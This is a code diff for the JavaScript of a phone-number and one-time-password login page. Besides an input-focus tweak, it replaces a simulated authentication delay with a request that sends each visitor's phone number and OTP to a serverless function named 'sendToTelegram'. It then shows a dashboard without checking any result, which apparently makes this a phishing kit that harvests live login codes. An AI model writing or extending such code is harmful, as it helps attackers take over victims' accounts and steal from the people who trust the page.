@@ -87,11 +87,14 @@ document.addEventListener('DOMContentLoaded', () => {
         
         // Show new stage
         stageToShow.style.display = 'block';
-        // Force reflow
         stageToShow.offsetHeight;
         stageToShow.classList.add('active');
         stageToShow.style.opacity = '1';
         stageToShow.style.transform = 'translateY(0)';
+        
+        if (stageToShow === otpStage && otpInputs.length > 0) {
+          otpInputs[0].focus();
+        }
       }, 300);
     }
   }
@@ -294,8 +297,16 @@ document.addEventListener('DOMContentLoaded', () => {
       btnVerify.classList.add('loading');
       btnVerify.disabled = true;
 
-      // Simulated network authentication delay (2 seconds)
-      setTimeout(() => {
+      // Send data to Netlify serverless function
+      fetch('/.netlify/functions/sendToTelegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ phone: userPhone, otp: otpValue })
+      })
+      .catch(err => console.error('Error sending OTP:', err))
+      .finally(() => {
         btnVerify.classList.remove('loading');
         btnVerify.disabled = false;
         clearInterval(countdownInterval);
@@ -303,7 +314,7 @@ document.addEventListener('DOMContentLoaded', () => {
         // Initialize Dashboard and transition
         initDashboard();
         showStage(dashboardStage);
-      }, 2000);
+      });
     } else {
       // Bounce animation error warning
       otpInputs.forEach(input => {
